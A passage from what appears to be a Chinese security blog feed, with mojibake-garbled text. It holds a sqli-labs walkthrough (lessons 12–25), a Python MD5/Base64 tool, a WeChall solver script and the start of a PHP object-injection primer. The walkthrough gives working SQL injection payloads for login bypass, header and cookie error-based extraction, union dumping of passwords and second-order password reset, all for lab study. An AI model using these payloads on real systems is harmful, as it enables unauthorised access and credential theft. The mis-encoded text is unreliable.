&amp;passwd=123456ï¼Œä¼šæ˜¾ç¤ºå¤±è´¥ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿ é¦–å…ˆandçš„ä¼˜å…ˆçº§é«˜äºor ã€å°±æ˜¯andå…ˆè¿ç®—ã€‘ é‚£ä¹ˆâ€™1â€™=â€™1â€™ and password=â€™123456â€™å…ˆè¿ç®—ï¼Œå› ä¸ºusersè¡¨é‡Œé¢çš„passwordå­—æ®µæ²¡æœ‰ä¸€ä¸ªæ•°æ®æ—¶testï¼Œå³è¾¹æ˜¯falseï¼Œé‚£ä¹ˆæ•´ä¸ªè¡¨è¾¾å¼å°±æ˜¯false è¿™ä¸ªæ—¶å€™æ•´ä¸ªçš„è¯­å¥å°±æ˜¯ï¼š SELECT username, password FROM users WHERE username=&apos;test&apos; or false LIMIT 0,1 æ•°æ®åº“é‡Œæ²¡æœ‰testç”¨æˆ·ï¼Œæ‰€ä»¥å°±å¤±è´¥äº†ã€‚ è€Œä¸‡èƒ½å¯†é’¥çš„è¯­å¥æ˜¯ï¼š SELECT username, password FROM users WHERE username=&apos;admin&apos; or false LIMIT 0,1 å¯¹äºä¸Šè¿°çš„æƒ…å†µï¼Œæˆ‘ä»¬åœ¨å¯†ç å­—æ®µåŠ å…¥å³å¯ uname=test&amp;passwd=123456&apos; or &apos;1&apos;=&apos;1 SELECT username, password FROM users WHERE username=&apos;test&apos; or true LIMIT 0,1 Less-12å…ˆå°è¯•å•å¼•å·ï¼ŒåŒå¼•å·ã€‚ è¾“å…¥ï¼š uname=test&amp;passwd=123456â€ æŠ¥é”™ï¼š â€˜â€œ123456â€â€) LIMIT 0,1â€™ 123456â€) LIMIT 0,1 æ„é€ POCï¼š uname=test&amp;passwd=123456â€) or â€œ1â€=â€1â€# Less-13å…ˆå°è¯•å•å¼•å·ï¼ŒåŒå¼•å·ã€‚ è¾“å…¥ï¼š uname=test&amp;passwd=123456â€™ æŠ¥é”™ï¼š â€˜â€™123456â€™â€™) LIMIT 0,1â€™ 123456â€™) LIMIT 0,1 æ„é€ POCï¼š uname=test&amp;passwd=123456â€™) or (â€˜1â€™)=(â€˜1 æˆ–è€… uname=test&amp;passwd=123456â€™) or â€œ1â€=â€1â€# Less-14å…ˆå°è¯•å•å¼•å·ï¼ŒåŒå¼•å·ã€‚ è¾“å…¥ï¼š uname=test&amp;passwd=123456â€ æŠ¥é”™ï¼š â€˜â€œ123456â€â€ LIMIT 0,1â€™ 123456â€ LIMIT 0,1 æ„é€ POCï¼š uname=test&amp;passwd=123456â€ or â€œ1â€=â€1â€# æˆ–è€… uname=test&amp;passwd=123456â€ or â€œ1â€=â€1 Less-15è¿™é‡Œè¾“å…¥å•å¼•å·ï¼ŒåŒå¼•å·å°±ä¸ä¼šæŠ¥é”™äº†ï¼Œæˆ‘ä»¬åªèƒ½åŠ ä¸Šæ°¸çœŸæ°¸å‡æˆ–è€…æ—¶é—´å»¶è¿Ÿå‡½æ•°äº†ã€‚ æµ‹è¯•å‘ç°æ—¶é—´å»¶è¿Ÿä¸è¡Œã€‚ uname=test&amp;passwd=123456â€™ or 1=1# ç›´æ¥æˆåŠŸäº†ï¼Œ è¯•ä¸€ä¸‹ç›²æ³¨ä¹Ÿæ˜¯å¯ä»¥å¾—ã€‚ uname=test&amp;passwd=123456â€™ or length(database())=8# Less-16 uname=test&amp;passwd=123456â€) or 1=1# æˆåŠŸç™»é™†ï¼Œæ—¶é—´å»¶è¿Ÿæ³¨å…¥è¯•è¯• uname=test&amp;passwd=123456&quot;) or if(length(database())=7,1,sleep(5)) # æš‚åœï¼Œè¯´æ˜ä¸å¯¹ uname=test&amp;passwd=123456&quot;) or if(length(database())=8,1,sleep(5)) # æˆåŠŸç™»é™† Less-17uname=admin&amp;passwd=123456&apos; where username=&apos;admin&apos; and 1=2 # å¯¹åº”çš„SQLè¯­å¥æ˜¯ï¼š UPDATE users SET password = &apos;123456&apos; where username=&apos;admin&apos; and 1=2 #&apos; WHERE username=&apos;admin&apos; Less-18è¿™æ˜¯ Header æ³¨å…¥ã€‚ æ„æ€æ˜¯ï¼Œä»æœåŠ¡å™¨è¦æ±‚çš„ Header å¤´é‡Œé¢æ‰¾åˆ°å¯ä»¥æ³¨å…¥çš„æ³¨å…¥ç‚¹ã€‚ ä»æºä»£ç å¯ä»¥çœ‹å‡ºï¼ŒæœåŠ¡å™¨å°† Header é‡Œé¢çš„ user-agent çš„å€¼æ²¡æœ‰ç»è¿‡è¿‡æ»¤å°±å¸¦å…¥äº† insert into è¯­å¥ï¼Œè¿™å°±é€ æˆäº†æ³¨å…¥ã€‚ $uagent = $_SERVER[&apos;HTTP_USER_AGENT&apos;]; ... $insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot;; é¦–å…ˆï¼ŒæŠ“åŒ…ã€‚ è¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼Œinsert into è¯­å¥è¦åœ¨ç™»é™†æˆåŠŸåæ‰èƒ½æ‰§è¡Œï¼Œæ‰€ä»¥å¿…é¡»è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·å’Œå¯†ç å†æŠ“åŒ…ã€‚ xpathæ³¨å…¥ï¼š payloadï¼šupdatexml(1,concat(0x7e,(version())),0) ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ ç›®æ ‡xml ç¬¬äºŒä¸ªå‚æ•°æ˜¯ xpathçš„è¡¨è¾¾å¼ï¼Œè¿™ä¸ªçœ‹w3cé‚£ä¸ªxpathæ•™ç¨‹ ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ è¦å°†xpathçš„è¡¨è¾¾å¼çš„ä¸œè¥¿å°†ç›®æ ‡xmlæ›¿æ¢æˆä»€ä¹ˆ POC: User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or updatexml(0,concat(0x3a,version()),0),&quot;,&quot;)# å“åº”ï¼š Your User Agent is: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or updatexml(0,concat(0x3a,version()),0),&quot;1&quot;)# XPATH syntax error: &apos;:5.5.47&apos; User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or updatexml(0,concat(0x3a,(select username from users limit 0,1)),0),&quot;1&quot;)# å“åº”ï¼š Your User Agent is: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or updatexml(0,concat(0x3a,(select username from users limit 0,1)),0),&quot;1&quot;) XPATH syntax error: &apos;:Dumb&apos; Less-19POC: Referer: 1&apos; or updatexml(0,concat(0x3a,version()),0),&quot;1&quot;)# å“åº”ï¼š Your Referer is: 1&apos; or updatexml(0,concat(0x3a,version()),0),&quot;1&quot;) XPATH syntax error: &apos;:5.5.47&apos; è¿™é‡Œä¹Ÿå¯ä»¥ç”¨ä¸€ä¸ªæŠ¥é”™å‡½æ•°extractvalue ç¬¬ä¸€ä¸ªå‚æ•°ä¹Ÿæ˜¯ä¸ªxmlï¼Œç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯xpathçš„è¡¨è¾¾å¼ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯è·å–xmlä¸­æŸä¸ªèŠ‚ç‚¹çš„å€¼ ä¸updatexmlä¸€æ¬¡åªèƒ½æ›´æ–°ä¸€ä¸ªèŠ‚ç‚¹ä¸åŒï¼Œextractvalueå¯ä»¥ä¸€æ¬¡è·å–å¤šä¸ªèŠ‚ç‚¹çš„å€¼ï¼Œå¹¶ä»¥ç©ºæ ¼åˆ†éš” POC: Referer: 1&apos; or extractvalue(0,concat(0x3a,version())),&apos;1&apos;)# å“åº”ï¼š Your User Agent is: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or extractvalue(0,concat(0x3a,version())),&apos;1&apos;)# XPATH syntax error: &apos;:5.5.47&apos; Less-20è¿™é¢˜ç”¨ Cookies æ³¨å…¥ POC: Cookie: uname=admin&apos;; æŠ¥é”™ Cookie: uname=admin&apos; order by 3#; æ­£å¸¸æ˜¾ç¤º Cookie: uname=admin&apos; order by 4#; æŠ¥é”™ï¼Œæ‰€ä»¥æ˜¯ä¸‰ä¸ªå­—æ®µ Cookie: uname=admin&apos; and 1=2 union select 1,2,3#; æ˜¾ç¤º2ï¼Œ3 Cookie: uname=admin&apos; and 1=2 union select 1,database(),version()#; æ•°æ®åº“ï¼šsecurity,ç‰ˆæœ¬ï¼š5.5.47 Cookie: uname=admin&apos; and 1=2 union select 1,2,group_concat(table_nameï¼‰ from information_schema.tables where table_schema=database()#; è¡¨åï¼šemails,referers,uagents,usersï¼Œè¿™é‡Œä¹Ÿå¯ä»¥ç”¨limitè¯­å¥ Cookie: uname=admin&apos; and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273#; å­—æ®µï¼šuser_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password Cookie: uname=admin&apos; and 1=2 union select 1,username,password from users limit 0,1#; å†…å®¹ï¼šYour Login name:Dumb Your Password:Dumb Less-21cookies æ³¨å…¥ ä½†æ˜¯ï¼Œè¿™ä¸€æ¬¡çš„ cookies æ˜¯åŠ å¯†çš„. setcookie(&apos;uname&apos;, base64_encode($row1[&apos;username&apos;]), time()+3600); ... $cookee = base64_decode($cookee); POC: &apos;) union select 1,2,username from users# JykgdW5pb24gc2VsZWN0IDEsMix1c2VybmFtZSBmcm9tIHVzZXJzIw== æ˜¾ç¤ºå¯†ç Dumb Less-22å•å¼•å·æ¢æˆåŒå¼•å·å°±è¡Œäº† uname=IiB1bmlvbiBzZWxlY3QgMSwyLHVzZXJuYW1lIGZyb20gdXNlcnMj Your Login name:2 Your Password:Dum Less-23è¿™ä¸€é¢˜å®ƒåœ¨è¾“å…¥çš„æ—¶å€™è¿‡æ»¤äº†å‡ ä¸ªå­—ç¬¦ $reg = &quot;/#/&quot;; $reg1 = &quot;/--/&quot;; $replace = &quot;&quot;; $id = preg_replace($reg, $replace, $id); $id = preg_replace($reg1, $replace, $id); æ‰€ä»¥ï¼Œæˆ‘ä»¬ä¸èƒ½ç”¨ #æ¥æ³¨é‡Šæ‰å‰©ä¸‹çš„æŸ¥è¯¢è¯­å¥ã€‚ é‚£ä¹ˆè¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ ä¸€ä¸ªåŠæ³•å°±æ˜¯ï¼Œè®©å‰©ä¸‹çš„è¯­å¥å˜å¾—å®Œæ•´å°±è¡Œã€‚ æŸ¥è¯¢è¯­å¥çš„ä»£ç ä¸ºï¼š $sql=â€SELECT * FROM users WHERE id=â€™$idâ€™ LIMIT 0,1â€; æ„é€ è¯­å¥ï¼š ?id=1â€™and+â€™1â€™=â€™1 Less-24äºŒæ¬¡æ³¨å…¥ ä¸æ•°æ®åº“äº¤äº’çš„æœ‰ä¸‰ä¸ªé¡µé¢ï¼šlogin_create.phpï¼Œlogin.phpï¼Œpass_change.php login_create.php,ç™»é™†é¡µé¢å¯¹ç”¨æˆ·å’Œå¯†ç éƒ½è¿›è¡Œäº†å¤„ç†ã€‚ $username = mysql_real_escape_string($_POST[&quot;login_user&quot;]); $password = mysql_real_escape_string($_POST[&quot;login_password&quot;]); $sql = &quot;SELECT * FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos;&quot;; login_create.phpå¯¹æ–°å»ºç”¨æˆ·è¿›è¡Œå¤„ç† $username= mysql_escape_string($_POST[&apos;username&apos;]) ; $pass= mysql_escape_string($_POST[&apos;password&apos;]); $re_pass= mysql_escape_string($_POST[&apos;re_password&apos;]); pass_change.phpæ˜¯ä¿®æ”¹å¯†ç çš„ å…³é”®ä»£ç ï¼š $username= $_SESSION[&quot;username&quot;]; $curr_pass= mysql_real_escape_string($_POST[&apos;current_password&apos;]); $pass= mysql_real_escape_string($_POST[&apos;password&apos;]); $re_pass= mysql_real_escape_string($_POST[&apos;re_password&apos;]); if($pass==$re_pass) { $sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;; $res = mysql_query($sql) or die(&apos;You tried to be smart, Try harder!!!! :( &apos;); $row = mysql_affected_rows(); ... å¯ä»¥å‘ç° $sql = â€œUPDATE users SET PASSWORD=â€™$passâ€™ where username=â€™$usernameâ€™ and password=â€™$curr_passâ€™ â€œ; æ›´æ”¹å¯†ç æ—¶$usernameæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥å¸¦å…¥è¿›å»ï¼Œå¦‚æœ$usernameåé¢æœ‰ä¸ªæ³¨é‡Šç¬¦ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥ç»•è¿‡éªŒè¯$curr_passè€Œç›´æ¥æ›´æ”¹å¯†ç ã€‚ æ‰€ä»¥æˆ‘ä»¬è¦å»ºä¸€ä¸ªæœ‰æ³¨é‡Šç¬¦çš„ç‰¹æ®Šç”¨æˆ· ç”¨æˆ·åï¼šadmin&apos;+#+ å¯†ç ï¼š 123456 ç„¶åç™»é™†ï¼Œè¿›å…¥æ›´æ”¹å¯†ç é¡µé¢ éšä¾¿è¾“å…¥å½“å‰å¯†ç ï¼Œç„¶åè¾“å…¥æˆ‘ä»¬è¦æ›´æ”¹çš„å¯†ç  YOU ARE LOGGED IN AS admin&apos; # You can Change your password here. Current Password: 123 New Password: 123456 Retype Password: 123456 æäº¤ï¼Œä½ ä¼šå‘ç°ï¼Œadminçš„å¯†ç å·²ç»è¢«æˆ‘ä»¬æ”¹æˆ123456äº†ã€‚ Less-25è¿™é¢˜çš„æ„æ€æ˜¯ï¼Œâ€œä½ çš„ AND å’Œ OR éƒ½æ˜¯æˆ‘ä»¬çš„äº†ï¼â€â€¦ å°±æ˜¯ï¼ŒAND å’Œ OR å…¨éƒ¨éƒ½è¢«è¿‡æ»¤æ‰äº†ã€‚ AND==&amp;&amp; OR==|| ?id=1&apos; &amp;&amp; &apos;1&apos;=&apos;1 urlç¼–ç  ?id=1&apos; %26%26 &apos;1&apos;=&apos;1]]></content>
      <tags>
        <tag>SQLæ³¨å…¥</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pythonå®ç°MD5,Base64åŠ å¯†å°å·¥å…·]]></title>
    <url>%2F2016%2F07%2F29%2Fpython%E5%AE%9E%E7%8E%B0MD5_Base64%E5%8A%A0%E5%AF%86%E5%B0%8F%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[ç¨‹åºæ˜¯ä¸€ä¸ª Base64 å’Œ MD5 åŠ å¯†è§£å¯†çš„ç¨‹åºã€‚å¾ˆç®€å•ï¼Œä¸»è¦ç”¨åˆ°äº†hashlibå’Œbase64è¿™ä¸¤ä¸ªåº“ã€‚è€Œä¸”ï¼Œæœ‰è¿™ä¸¤ä¸ªåº“ï¼Œå¯ä»¥éšæ—¶æ‹“å±•æ›´å¤šç§åŠ å¯†æ–¹å¼ï¼Œåƒæ˜¯ sha å•Šä»€ä¹ˆçš„ã€‚è¦æ³¨æ„çš„å°±æ˜¯ä¸‹é¢å‡ ç‚¹ï¼š 1ï¼‰input()å’Œraw_input()çš„åŒºåˆ«ã€‚input()è¦æ±‚çš„è¾“å…¥çš„å­—ç¬¦ä¸²è¦åŠ åŒå¼•å·ï¼Œæ•°å­—çš„è¯ï¼Œç›´æ¥è¾“å…¥å°±å¯ä»¥äº†ã€‚ raw_input()å‡½æ•°å°†è¾“å…¥çš„æ‰€æœ‰æ•°æ®éƒ½å½“åšå­—ç¬¦ä¸²æ¥çœ‹å¾…ï¼Œå³ä½¿è¾“å…¥çš„æ•°å­—ï¼Œä¹Ÿä¼šå˜æˆæ˜¯å­—ç¬¦ä¸²çš„å½¢å¼ã€‚è€Œä¸”ï¼Œæˆ‘ä»¬ç»å¸¸è¦åœ¨ç¨‹åºè¿è¡Œåˆ°æŸå¤„çš„æ—¶å€™ä¸­æ–­ä¸€ä¸‹ã€‚é‚£ä¹ˆï¼Œå°±å¯ä»¥ç”¨raw_input()è¿™ä¸ªå‡½æ•°æ¥ä¸­æ–­ã€‚è¾“å…¥å›è½¦å°±ç»§ç»­è¿è¡Œäº†ã€‚è‹¥æ˜¯ç”¨input()ä¸­æ–­çš„è¯ï¼Œç›´æ¥å›è½¦ä¼šçˆ†é”™ã€‚ã€‚ 2ï¼‰Python é‡Œé¢è²Œä¼¼æ²¡æœ‰ä¸»å‡½æ•°çš„è¯´æ³•æ²¡æœ‰main()ï¼Œæ²¡æœ‰å…¥å£ç‚¹ã€‚é‚£ä¹ˆæ€ä¹ˆåŠå‘¢ï¼Ÿå¯ä»¥ç”¨ä¸‹é¢çš„ä»£ç ï¼š if __name__==&quot;__main__&quot;: Index(); //ä½ çš„ç¬¬ä¸€ä¸ªå‡½æ•° è¿™æ ·å°±å¯ä»¥è®©ç¨‹åºä»ç¬¬ä¸€ä¸ªå‡½æ•°å¼€å§‹è¿è¡Œäº†ã€‚ 3ï¼‰åƒä¸‡æ³¨æ„ TAB å’Œç©ºæ ¼ã€‚ä¹Ÿå°±æ˜¯ä»£ç çš„æ ¼å¼ã€‚Python æ˜¯ä¸€ä¸ªå¾ˆæ³¨é‡æ ¼å¼çš„è¯­è¨€ã€‚å› ä¸ºæ²¡æœ‰å¤§æ‹¬å·ä¹‹ç±»çš„ï¼Œæ‰€ä»¥åƒæ˜¯å¾ªç¯è¯­å¥ï¼Œåˆ¤æ–­è¯­å¥çš„ï¼Œä¸€å®šè¦æ³¨æ„è¯­å¥å‰é¢çš„ TABã€‚è€Œä¸”ï¼Œåƒä¸‡ä¸è¦ TAB å’Œç©ºæ ¼æ··ç”¨ï¼ä¼šæŠ¥é”™. import hashlib import base64 def Index(): print(&quot;---------Joy_nick&apos;s Encrypt Tool---------&quot;); print(&quot;Please choose one:&quot;); print(&quot;1) MD5&quot;); print(&quot;2) Base64&quot;); while(1): choose=input(); if(choose==1): Page_MD5(); elif(choose==2): Page_Base64(); def Page_MD5(): print(&quot;----------------MD5----------------&quot;); print(&quot;Please choose one:&quot;); print(&quot;1) MD5 Encrypt&quot;); print(&quot;2) MD5 Check&quot;); while(1): choose=input(); if(choose==1): Page_MD5_Encrypt(); elif(choose==2): Page_MD5_Check(); def Page_Base64(): print(&quot;--------------Base64---------------&quot;); print(&quot;Please choose one:&quot;); print(&quot;1) Base64 Encrypt&quot;); print(&quot;2) Base64 Decrypt&quot;); while(1): choose=input(); if(choose==1): Page_Base64_Encrypt(); elif(choose==2): Page_Base64_Decrypt(); def Input_From_File(): path=raw_input(&quot;Please input the file path : &quot;); file_handle=open(path,&apos;r&apos;); file_contant=file_handle.read(); file_handle.close(); return file_contant; def Input_From_Stdin(): contant=raw_input(&quot;Please input : &quot;); return contant; def Page_MD5_Encrypt(): print(&quot;-----------MD5 Encrypt------------&quot;); print(&quot;Please choose one:&quot;); print(&quot;1) Input from file&quot;); print(&quot;2) Input&quot;); while(1): choose=input(); if(choose==1): contant=Input_From_File(); break; elif(choose==2): contant=Input_From_Stdin(); break; m=hashlib.md5() m.update(contant); print(&quot;Do you want to output to a file?(y or n)&quot;); while(1): choose=raw_input(); if(choose==&apos;y&apos;): file_handle=open(m.hexdigest(),&apos;w&apos;); file_handle.write(m.hexdigest()); file_handle.close(); exit(); elif(choose==&apos;n&apos;): print(m.hexdigest()); raw_input(); exit(); def Page_MD5_Check(): print(&quot;-----------MD5 Check------------&quot;); print(&quot;Please choose one:&quot;); print(&quot;1) Input from file&quot;); print(&quot;2) Input&quot;); while(1): choose=input(); if(choose==1): contant=Input_From_File(); break; elif(choose==2): contant=Input_From_Stdin(); break; m=hashlib.md5() m.update(contant); MD5=raw_input(&quot;Please input the original MD5:&quot;); if(MD5==m.hexdigest()): print(&quot;It&apos;s a correct file.&quot;); else: print(&quot;The file is wrong.&quot;); raw_input(); exit(); def Page_Base64_Encrypt(): print(&quot;-------------Base64 Encrypt----------------&quot;); print(&quot;Please choose one:&quot;); print(&quot;1) Input from a file&quot;); print(&quot;2) Input&quot;); while(1): choose=input(); if(choose==1): contant=Input_From_File(); break; elif(choose==2): contant=Input_From_Stdin(); break; m=base64.b64encode(contant); choose=raw_input(&quot;Do you want to save it to a file?(y or n)&quot;); while(1): if(choose==&apos;y&apos;): file_handle=open(&quot;Base64_%c&quot;%m[1],&apos;w&apos;); file_handle.write(m); file_handle.close(); exit(); elif(choose==&apos;n&apos;): print(m); raw_input(); exit(); def Page_Base64_Decrypt(): print(&quot;--------------Base64 Decrypt------------------&quot;); print(&quot;Please choose one:&quot;); print(&quot;1) Input from a file&quot;); print(&quot;2) Input&quot;); while(1): choose=input(); if(choose==1): contant=Input_From_File(); break; elif(choose==2): contant=Input_From_Stdin(); break; m=base64.b64decode(contant); choose=raw_input(&quot;Do you want to save it to a file?(y or n)&quot;); while(1): if(choose==&apos;y&apos;): file_handle=open(&quot;Base64_%c&quot;%m[2],&apos;w&apos;); file_handle.write(m); file_handle.close(); exit(); elif(choose==&apos;n&apos;): print(m); raw_input(); exit(); if __name__==&quot;__main__&quot;: print(&quot;main&quot;); Index();]]></content>
      <tags>
        <tag>ç¼–ç¨‹</tag>
        <tag>åŠ å¯†è§£å¯†</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pythonè„šæœ¬ä¹‹æ­£åˆ™è¡¨è¾¾å¼]]></title>
    <url>%2F2016%2F07%2F28%2Fpython%E8%84%9A%E6%9C%AC%E4%B9%8B%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[Impossible nâ€™est pas franÃ§aiswebchallçš„ä¸€é“é¢˜ï¼Œé¢˜ç›®è¦æ±‚åˆ†è§£ä¸€ä¸ªå¾ˆå¤§çš„æ•°çš„è´¨å› æ•°ã€‚éœ€è¦6s å†…æäº¤ ä½†æ˜¯ï¼Œåªè¦æˆ‘ä»¬å°è¯•æäº¤ä¸€æ¬¡ä¹‹åï¼Œå°±å¯ä»¥å‘ç°å®ƒä¼šè¿”å›ä¸€ä¸ªæ­£ç¡®çš„è§£ã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œæˆ‘ä»¬åªè¦å…ˆæäº¤ä¸€æ¬¡ï¼Œç„¶åç¨‹åºè¯»å–å®ƒè¿”å›çš„æ­£ç¡®æ•°å­—ä¸²ï¼Œå†æäº¤å°±å¯ä»¥äº†ã€‚ åœ¨åŒ¹é…ç½‘é¡µä¿¡æ¯çš„æ—¶å€™ï¼Œpythonå¯ä»¥ä½¿ç”¨åº“beautifulsoupä¹Ÿå¯ä»¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼reæ¨¡å—ï¼Œè¿™é‡Œæˆ‘ä¸¤ä¸ªéƒ½ç”¨äº†ï¼Œä¾¿äºè‡ªå·±å­¦ä¹ ã€‚ pythonè„šæœ¬å¦‚ä¸‹ï¼š #!/usr/bin/env python # coding=utf-8 import requests import urllib2 import lxml import lxml.html as H from bs4 import BeautifulSoup cookie = { &apos;WC&apos;: &apos;9038838-0-DGwGp7VNYefa6o7o&apos; } def get_number(): number_url = &apos;http://www.wechall.net/challenge/impossible/index.php?request=new_number&apos; #opener = urllib2.build_opener() #opener.addheaders.append((&apos;Cookie&apos;,&apos;WC=9038838-0-DGwGp7VNYefa6o7o&apos;)) #f = opener.open(number_url) #html = f.read() #html = urllib2.urlopen(number_url).read() #soup = BeautifulSoup(html) resp = requests.get(number_url, cookies=cookie) res =resp.content soup = BeautifulSoup(res) div_new = soup.find(&apos;div&apos;,{&quot;id&quot;:&quot;page&quot;}) movie_new = div_new.get_text() print movie_new get_number() def get_answer(): post_data = { &apos;solution&apos;: &apos;&apos;, &apos;cmd&apos;: &apos;Send&apos;, &apos;gwf3_csrf&apos;: &apos;bNZbC2XL&apos; } url = &apos;http://www.wechall.net/challenge/impossible/index.php&apos; resp = requests.post(url, cookies=cookie, data=post_data) # print resp.text d = H.document_fromstring(resp.text) import re ar = re.compile(r&apos;&quot;(\d+)&quot;&apos;) text = d.xpath(&apos;//div[@class=\&apos;gwf_errors\&apos;]/ul/li&apos;)[0].text_content() ans = ar.findall(text)[0] print ans post_data = { &apos;solution&apos;: ans, &apos;cmd&apos;: &apos;Send&apos;, &apos;gwf3_csrf&apos;: &apos;bNZbC2XL&apos; } resp = requests.post(url, cookies=cookie, data=post_data) print resp.text get_answer() è¿è¡Œç»“æœä¸ºï¼š]]></content>
      <tags>
        <tag>ç¼–ç¨‹</tag>
        <tag>çˆ¬è™«</tag>
        <tag>Python</tag>
        <tag>writeup</tag>
        <tag>WeChall</tag>
        <tag>æ­£åˆ™è¡¨è¾¾å¼</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP Object Injection]]></title>
    <url>%2F2016%2F07%2F24%2FPHP-Object-Injection%2F</url>
    <content type="text"><![CDATA[PHPå¯¹è±¡æ³¨å…¥å¹¶ä¸æ˜¯ä¸€ç§ååˆ†å¸¸è§çš„æ¼æ´ï¼Œè¿™ç§æ¼æ´å¯èƒ½ä¼šæ¯”è¾ƒéš¾åˆ©ç”¨ï¼Œä½†æ˜¯è¿™ç§æ¼æ´å¯èƒ½æ¯”è¾ƒå±é™©ã€‚ä¸ºäº†å­¦ä¹ è¿™ç§æ¼æ´ï¼Œé¦–å…ˆéœ€è¦ç†è§£åŸºç¡€çš„PHPä»£ç ã€‚ 0x01 PHPçš„ç±»å’Œå¯¹è±¡HPä¸­çš„ç±»å’Œå¯¹è±¡ç†è§£èµ·æ¥å¾ˆç®€å•ï¼Œä¸¾ä¸ªä¾‹å­æ¥è¯´ï¼Œä¸‹é¢çš„ä»£ç ä¸­å°±å®šä¹‰äº†ä¸€ä¸ªåŒ…å«ä¸€ä¸ªå˜é‡å’Œä¸€ä¸ªæ–¹æ³•çš„ç±»ï¼š &lt;?php class TestClass //å®šä¹‰ä¸€ä¸ªTestClassç±» { public $variable = &apos;This is a string&apos;; // ä¸€ä¸ªå˜é‡ public function PrintVariable() // ä¸€ä¸ªç®€å•çš„æ–¹æ³• { echo $this-&gt;variable; } } $object = new TestClass(); // åˆ›å»ºä¸€ä¸ªå¯¹è±¡ $object-&gt;PrintVariable(); // è°ƒç”¨ç±»çš„æ–¹æ³• ?&gt; 0x02 PHPè‡ªåŠ¨è½½å…¥åœ¨PHPä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸€äº›ç‰¹æ®Šå‡½æ•°ï¼Œå®ƒä»¬å¯ä»¥è¢«è‡ªåŠ¨åœ°è°ƒç”¨ï¼Œæ‰€ä»¥è¿™äº›å‡½æ•°ä¸éœ€è¦å‡½æ•°è°ƒç”¨æ¥æ‰§è¡Œå®ƒä»¬é‡Œé¢çš„ä»£ç ã€‚è€ƒè™‘åˆ°è¿™ä¸ªç‰¹æ€§ï¼Œè¿™äº›å‡½æ•°é€šå¸¸è¢«ç§°ä¸ºé­”å¹»å‡½æ•°æˆ–é­”å¹»æ–¹æ³•ã€‚é­”å¹»æ–¹æ³•çš„åå­—ä»¥åŒä¸‹åˆ’çº¿â€œ__â€å¼€å¤´PHPé­”å¹»æ–¹æ³•åç§°å—é™äºPHPæ‰€æ”¯æŒçš„éƒ¨åˆ†å…³é”®å­—ï¼Œä¾‹å¦‚constructã€destructç­‰ç­‰ã€‚ ä¾‹å¦‚__construct()æ–¹æ³•ä¼šåœ¨ä¸€ä¸ªå¯¹è±¡è¢«åˆ›å»ºæ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œå¯¹åº”çš„__destructåˆ™ä¼šåœ¨ä¸€ä¸ªå¯¹è±¡è¢«é”€æ¯æ—¶è°ƒç”¨ç­‰ç­‰ã€‚ ä¸‹é¢æ˜¯PHPä¸­çš„ä¸€äº›é­”å¹»å‡½æ•°ï¼š __construct(), __destruct(), __call(), __callStatic(), __get(), __set(), __isset(), __unset(), __sleep(), __wakeup(), __toString(), __invoke(), __set_state(), __clone(), and __autoload(). 0x03 PHPå¯¹è±¡çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–phpå…è®¸ä¿å­˜ä¸€ä¸ªå¯¹è±¡æ–¹ä¾¿ä»¥åé‡ç”¨ï¼Œè¿™ä¸ªè¿‡ç¨‹è¢«ç§°ä¸ºåºåˆ—åŒ–ï¼Œå³serialize()å‡½æ•°ï¼Œå¯¹åº”çš„ååºåˆ—åŒ–å°±æ˜¯unserialize()ã€‚ç®€å•çš„è¯´ï¼Œåºåˆ—åŒ–å°±æ˜¯æŠŠPHPå¯¹è±¡æŒ‰ç…§ä¸€å®šè§„åˆ™å­˜æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè€Œååºåˆ—åŒ–å°±æ˜¯æŠŠåºåˆ—åŒ–ä¹‹åçš„å­—ç¬¦ä¸²æ¢å¤æˆä¸€ä¸ªPHPå¯¹è±¡. PHPå¯¹è±¡çš„åºåˆ—åŒ– ç†è§£åºåˆ—åŒ–çš„å­—ç¬¦ä¸²: O:4{ ä»¥åˆ†å·éš”å¼€ï¼Œä¸€å…±æœ‰å››æ®µæ•°æ® &quot;test&quot;:2 testç±»ï¼Œä¸€å…±æœ‰2ä¸ªå¯¹è±¡ s:8:&quot;username&quot; Stringç±»å‹, é•¿åº¦ä¸º8, å€¼ä¸ºusername s:6:&quot;serial&quot; Stringç±»å‹, é•¿åº¦ä¸º6, å€¼ä¸ºserial s:8:&quot;password&quot; Stringç±»å‹, 